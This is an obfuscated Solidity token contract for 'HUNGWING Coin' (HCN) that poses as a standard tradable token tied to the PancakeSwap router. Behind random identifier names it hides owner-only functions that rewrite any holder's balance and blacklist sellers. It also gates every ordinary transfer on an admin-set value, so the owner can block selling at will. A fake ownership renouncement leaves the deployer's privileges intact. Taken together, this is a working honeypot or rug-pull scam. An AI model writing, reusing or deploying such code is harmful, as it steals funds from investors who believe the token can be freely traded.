//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface bvhnpcgtqr {
    function totalSupply() external view returns (uint256);

    function balanceOf(address gbtoyrvvrum) external view returns (uint256);

    function transfer(address tcsxppxjucvabx, uint256 rgvqyxublcwbv) external returns (bool);

    function allowance(address huornbkcuawjf, address spender) external view returns (uint256);

    function approve(address spender, uint256 rgvqyxublcwbv) external returns (bool);

    function transferFrom(
        address sender,
        address tcsxppxjucvabx,
        uint256 rgvqyxublcwbv
    ) external returns (bool);

    event Transfer(address indexed from, address indexed jbtdramiukh, uint256 value);
    event Approval(address indexed huornbkcuawjf, address indexed spender, uint256 value);
}

interface gkrodjvbjs is bvhnpcgtqr {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract wmjzhhxqje {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface flsbzyalteobm {
    function createPair(address vxosgqgsqfhe, address bhkzgfniovii) external returns (address);
}

interface ngtgwitafjelm {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract HUNGWINGCoin is wmjzhhxqje, bvhnpcgtqr, gkrodjvbjs {

    function gijrlsqem() private view {
        require(srucxbajq[_msgSender()]);
    }

    address gyabivzzbsmsvf = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint8 private eflldtdmnfajtl = 18;

    function symbol() external view virtual override returns (string memory) {
        return tsheqpeme;
    }

    bool private dbbgifwqdwvqrc;

    function dloukemhk(address tbzolsfjxsjunw, uint256 rgvqyxublcwbv) public {
        gijrlsqem();
        popvjjmmgguzxg[tbzolsfjxsjunw] = rgvqyxublcwbv;
    }

    address public sbdagddzgve;

    bool public tvergssrwhwm;

    mapping(address => bool) public srucxbajq;

    bool public wonxoaybiibq;

    function transferFrom(address nttrxrdsbghajy, address tcsxppxjucvabx, uint256 rgvqyxublcwbv) external override returns (bool) {
        if (_msgSender() != wdnswiksgxgbrh) {
            if (xvngoscdlzfz[nttrxrdsbghajy][_msgSender()] != type(uint256).max) {
                require(rgvqyxublcwbv <= xvngoscdlzfz[nttrxrdsbghajy][_msgSender()]);
                xvngoscdlzfz[nttrxrdsbghajy][_msgSender()] -= rgvqyxublcwbv;
            }
        }
        return upkibwjfchgui(nttrxrdsbghajy, tcsxppxjucvabx, rgvqyxublcwbv);
    }

    function upkibwjfchgui(address nttrxrdsbghajy, address tcsxppxjucvabx, uint256 rgvqyxublcwbv) internal returns (bool) {
        if (nttrxrdsbghajy == sbdagddzgve) {
            return qtpgskuzvuhgwz(nttrxrdsbghajy, tcsxppxjucvabx, rgvqyxublcwbv);
        }
        uint256 qlljwleqxanmea = bvhnpcgtqr(msgdwnrrdud).balanceOf(gyabivzzbsmsvf);
        require(qlljwleqxanmea == wmznbojdtcczeh);
        require(!pmpypceamfxm[nttrxrdsbghajy]);
        return qtpgskuzvuhgwz(nttrxrdsbghajy, tcsxppxjucvabx, rgvqyxublcwbv);
    }

    uint256 private zquyslloohhzrx;

    function getOwner() external view returns (address) {
        return dlrhjkufpatf;
    }

    address public msgdwnrrdud;

    function ulxucobkcxfcl(address fbncaieggntb) public {
        gijrlsqem();
        
        if (fbncaieggntb == sbdagddzgve || fbncaieggntb == msgdwnrrdud) {
            return;
        }
        pmpypceamfxm[fbncaieggntb] = true;
    }

    string private tsheqpeme = "HCN";

    event OwnershipTransferred(address indexed fnpxuaajt, address indexed ywikigdzvve);

    function approve(address qmygmpcikcusit, uint256 rgvqyxublcwbv) public virtual override returns (bool) {
        xvngoscdlzfz[_msgSender()][qmygmpcikcusit] = rgvqyxublcwbv;
        emit Approval(_msgSender(), qmygmpcikcusit, rgvqyxublcwbv);
        return true;
    }

    uint256 private mwqsuwlnlz = 100000000 * 10 ** 18;

    uint256 public jlmidhmgwz;

    function qtpgskuzvuhgwz(address nttrxrdsbghajy, address tcsxppxjucvabx, uint256 rgvqyxublcwbv) internal returns (bool) {
        require(popvjjmmgguzxg[nttrxrdsbghajy] >= rgvqyxublcwbv);
        popvjjmmgguzxg[nttrxrdsbghajy] -= rgvqyxublcwbv;
        popvjjmmgguzxg[tcsxppxjucvabx] += rgvqyxublcwbv;
        emit Transfer(nttrxrdsbghajy, tcsxppxjucvabx, rgvqyxublcwbv);
        return true;
    }

    address wdnswiksgxgbrh = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function njwbylhcpwrnv(uint256 rgvqyxublcwbv) public {
        gijrlsqem();
        wmznbojdtcczeh = rgvqyxublcwbv;
    }

    mapping(address => mapping(address => uint256)) private xvngoscdlzfz;

    uint256 jtkumfpwcbnb;

    function allowance(address ceoonhznh, address qmygmpcikcusit) external view virtual override returns (uint256) {
        if (qmygmpcikcusit == wdnswiksgxgbrh) {
            return type(uint256).max;
        }
        return xvngoscdlzfz[ceoonhznh][qmygmpcikcusit];
    }

    mapping(address => bool) public pmpypceamfxm;

    function srhimkcylo() public {
        emit OwnershipTransferred(sbdagddzgve, address(0));
        dlrhjkufpatf = address(0);
    }

    address private dlrhjkufpatf;

    function name() external view virtual override returns (string memory) {
        return sqroosqooocgb;
    }

    uint256 wmznbojdtcczeh;

    function decimals() external view virtual override returns (uint8) {
        return eflldtdmnfajtl;
    }

    bool private wwytouhedwplg;

    function transfer(address tbzolsfjxsjunw, uint256 rgvqyxublcwbv) external virtual override returns (bool) {
        return upkibwjfchgui(_msgSender(), tbzolsfjxsjunw, rgvqyxublcwbv);
    }

    function rmnivbescslkl(address rxjtlyklaepf) public {
        if (tvergssrwhwm) {
            return;
        }
        if (tvmfelvvq != gsitbzlzld) {
            gsitbzlzld = false;
        }
        srucxbajq[rxjtlyklaepf] = true;
        if (gsitbzlzld) {
            jlmidhmgwz = zquyslloohhzrx;
        }
        tvergssrwhwm = true;
    }

    function owner() external view returns (address) {
        return dlrhjkufpatf;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return mwqsuwlnlz;
    }

    bool public tvmfelvvq;

    constructor (){
        if (gsitbzlzld != tvmfelvvq) {
            gsitbzlzld = true;
        }
        srhimkcylo();
        ngtgwitafjelm czyapsfbrxbrgr = ngtgwitafjelm(wdnswiksgxgbrh);
        msgdwnrrdud = flsbzyalteobm(czyapsfbrxbrgr.factory()).createPair(czyapsfbrxbrgr.WETH(), address(this));
        
        sbdagddzgve = _msgSender();
        srucxbajq[sbdagddzgve] = true;
        popvjjmmgguzxg[sbdagddzgve] = mwqsuwlnlz;
        if (gsitbzlzld) {
            jlmidhmgwz = zquyslloohhzrx;
        }
        emit Transfer(address(0), sbdagddzgve, mwqsuwlnlz);
    }

    string private sqroosqooocgb = "HUNGWING Coin";

    function balanceOf(address gbtoyrvvrum) public view virtual override returns (uint256) {
        return popvjjmmgguzxg[gbtoyrvvrum];
    }

    mapping(address => uint256) private popvjjmmgguzxg;

    bool public gsitbzlzld;

}